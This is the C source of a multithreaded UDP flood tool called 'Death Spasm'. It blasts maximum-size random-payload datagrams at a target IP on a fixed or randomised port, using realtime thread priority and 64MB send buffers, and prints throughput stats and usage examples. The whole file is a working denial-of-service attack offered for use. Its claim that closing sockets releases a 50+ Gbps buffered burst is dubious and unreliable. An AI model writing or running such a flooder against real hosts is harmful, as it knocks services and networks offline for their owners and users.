#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <sched.h>
#include <sys/resource.h>

#define MAX_PAYLOAD 65507
#define MAX_THREADS 512

volatile int running = 1;
unsigned long long total_packets = 0;
unsigned long long total_bytes = 0;
pthread_mutex_t stats_lock;

typedef struct {
    char target[64];
    int port;
    int thread_id;
} worker_args_t;

void *udp_worker(void *arg) {
    worker_args_t *args = (worker_args_t *)arg;
    
    // Pin to CPU
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(args->thread_id % 8, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    // Realtime priority
    struct sched_param sp;
    sp.sched_priority = 99;
    pthread_setschedparam(pthread_self(), SCHED_RR, &sp);
    
    // Create socket with MAX buffer
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    int bufsize = 1024 * 1024 * 64;  // 64MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &addr.sin_addr);
    
    // Pre-generate payload
    char payload[MAX_PAYLOAD];
    for (int i = 0; i < MAX_PAYLOAD; i++) payload[i] = rand() % 256;
    
    // Port list for random mode
    int ports[65536];
    if (args->port == 0) {
        for (int i = 1; i < 65536; i++) ports[i] = i;
        for (int i = 1; i < 65536; i++) {
            int j = rand() % 65535 + 1;
            int tmp = ports[i];
            ports[i] = ports[j];
            ports[j] = tmp;
        }
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    int port_idx = 0;
    
    // ============================================================
    //  PHASE 1: FILL KERNEL BUFFERS
    // ============================================================
    
    // Send for 30 seconds (or until stopped)
    time_t end_time = time(NULL) + 30;
    
    while (running && time(NULL) < end_time) {
        struct sockaddr_in dest = addr;
        
        if (args->port == 0) {
            dest.sin_port = htons(ports[port_idx % 65535]);
            port_idx++;
        }
        
        ssize_t sent = sendto(sock, payload, MAX_PAYLOAD, 0,
                              (struct sockaddr *)&dest, sizeof(dest));
        
        if (sent > 0) {
            local_packets++;
            local_bytes += sent;
        }
        
        // Update stats in batches
        if (local_packets % 5000 == 0) {
            pthread_mutex_lock(&stats_lock);
            total_packets += 5000;
            total_bytes += local_bytes;
            pthread_mutex_unlock(&stats_lock);
            local_bytes = 0;
        }
    }
    
    // Final stats
    pthread_mutex_lock(&stats_lock);
    total_packets += local_packets;
    total_bytes += local_bytes;
    pthread_mutex_unlock(&stats_lock);
    
    // ============================================================
    //  PHASE 2: DEATH SPASM — HOLD THEN CLOSE
    // ============================================================
    
    // HOLD the socket open for 2 seconds
    // This lets the kernel buffer fill up with queued packets
    printf("[Thread %d] Holding socket for Death Spasm...\n", args->thread_id);
    usleep(2000000);  // 2 seconds
    
    // CLOSE THE SOCKET — THIS RELEASES EVERYTHING AT ONCE
    // All buffered packets FLUSH in one massive burst
    printf("[Thread %d] CLOSING SOCKET — BUFFER FLUSH!\n", args->thread_id);
    close(sock);
    
    return NULL;
}

void *monitor(void *arg) {
    int duration = *(int *)arg;
    time_t start = time(NULL);
    unsigned long long last_packets = 0;
    unsigned long long last_bytes = 0;
    
    printf("\n[+] Death Spasm Active — Watch dstat!\n\n");
    
    while (running) {
        sleep(1);
        time_t elapsed = time(NULL) - start;
        
        pthread_mutex_lock(&stats_lock);
        unsigned long long p = total_packets;
        unsigned long long b = total_bytes;
        pthread_mutex_unlock(&stats_lock);
        
        unsigned long long cp = p - last_packets;
        unsigned long long cb = b - last_bytes;
        double pps = cp / 1.0;
        double gbps = (cb * 8.0) / 1000000000.0;
        double total_gbps = (b * 8.0) / (elapsed * 1000000000.0);
        
        printf("\r[LAVA] Pkts: %10llu | PPS: %8.0f | BW: %5.2f Gbps | Cur: %5.2f Gbps | Time: %3lds   ",
               p, pps, total_gbps, gbps, elapsed);
        fflush(stdout);
        
        last_packets = p;
        last_bytes = b;
        
        if (elapsed >= duration) break;
    }
    return NULL;
}

void signal_handler(int sig) {
    running = 0;
    printf("\n\n[!] Interrupted!\n");
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("\n💀 DEATH SPASM — REAL WORKING VERSION\n");
        printf("========================================\n\n");
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        printf("Example: %s 1.2.3.4 0 30 256\n\n", argv[0]);
        printf("  PORT 0 = random ports\n");
        printf("  THREADS = CPU cores * 32 for max power\n");
        printf("  Watch dstat for Death Spasm spike!\n\n");
        return 1;
    }
    
    char *target = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    if (threads > MAX_THREADS) threads = MAX_THREADS;
    
    srand(time(NULL));
    signal(SIGINT, signal_handler);
    pthread_mutex_init(&stats_lock, NULL);
    
    // Increase limits
    setpriority(PRIO_PROCESS, 0, -20);
    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = 999999;
    rl.rlim_max = 999999;
    setrlimit(RLIMIT_NOFILE, &rl);
    
    printf("\n========================================\n");
    printf("  💀 DEATH SPASM — REAL WORKING\n");
    printf("========================================\n");
    printf("  Target:    %s\n", target);
    printf("  Port:      %d %s\n", port, port == 0 ? "(RANDOM)" : "");
    printf("  Duration:  %ds (filling buffers)\n", duration);
    printf("  Threads:   %d\n", threads);
    printf("  Buffer:    64MB per socket\n");
    printf("========================================\n\n");
    
    printf("[+] PHASE 1: Filling kernel buffers for %ds...\n", duration);
    printf("[+] PHASE 2: Holding sockets...\n");
    printf("[+] PHASE 3: CLOSING SOCKETS → BUFFER FLUSH!\n");
    printf("[+] EXPECT 50+ Gbps SPIKE!\n\n");
    
    // Create worker threads
    pthread_t worker_threads[MAX_THREADS];
    worker_args_t args[MAX_THREADS];
    
    printf("[+] Launching %d threads...\n", threads);
    
    for (int i = 0; i < threads; i++) {
        args[i].port = port;
        args[i].thread_id = i;
        strcpy(args[i].target, target);
        pthread_create(&worker_threads[i], NULL, udp_worker, &args[i]);
    }
    
    printf("[+] All threads launched!\n\n");
    
    // Monitor thread
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, monitor, &duration);
    
    // Wait for duration (filling phase)
    sleep(duration);
    
    // ============================================================
    //  TRIGGER DEATH SPASM
    // ============================================================
    
    printf("\n\n========================================\n");
    printf("  💀 DEATH SPASM TRIGGERED!\n");
    printf("========================================\n");
    printf("  Total Packets: %llu\n", total_packets);
    printf("  Total Bytes:   %.2f GB\n", total_bytes / 1e9);
    printf("  Closing %d sockets...\n", threads);
    printf("  ALL BUFFERED PACKETS RELEASING!\n");
    printf("========================================\n\n");
    
    // Stop workers — THIS CAUSES THE SPIKE
    running = 0;
    
    // Wait for threads to finish (they hold then close)
    for (int i = 0; i < threads; i++) {
        pthread_join(worker_threads[i], NULL);
    }
    pthread_join(monitor_thread, NULL);
    
    // ============================================================
    //  FINAL RESULTS
    // ============================================================
    
    printf("\n========================================\n");
    printf("  💥 DEATH SPASM COMPLETE!\n");
    printf("========================================\n");
    printf("  Total Packets: %llu\n", total_packets);
    printf("  Total Bytes:   %.2f GB\n", total_bytes / 1e9);
    printf("  Avg Bandwidth: %.2f Gbps\n", (total_bytes * 8.0) / (duration * 1e9));
    printf("  💀 CHECK DSTAT — SPIKE SHOULD BE VISIBLE!\n");
    printf("========================================\n");
    
    pthread_mutex_destroy(&stats_lock);
    return 0;
}
